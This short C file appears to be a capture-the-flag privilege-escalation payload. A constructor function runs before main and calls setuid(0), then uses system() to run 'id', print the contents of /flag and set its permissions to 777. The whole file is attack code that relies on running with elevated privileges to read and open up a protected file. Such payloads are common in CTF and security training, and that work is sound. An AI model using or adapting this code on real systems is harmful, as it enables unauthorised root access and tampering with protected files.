
#include <stdio.h>
#include <stdlib.h>
__attribute((constructor)) void before_main()
{
        setuid(0);
        system("id");
        system("cat /flag");
        system("chmod 777 /flag");
                printf("%s\n", __FUNCTION__);
}

int main(int argc, char **argv)
{
                printf("%s\n", __FUNCTION__);
                        return 0;
}

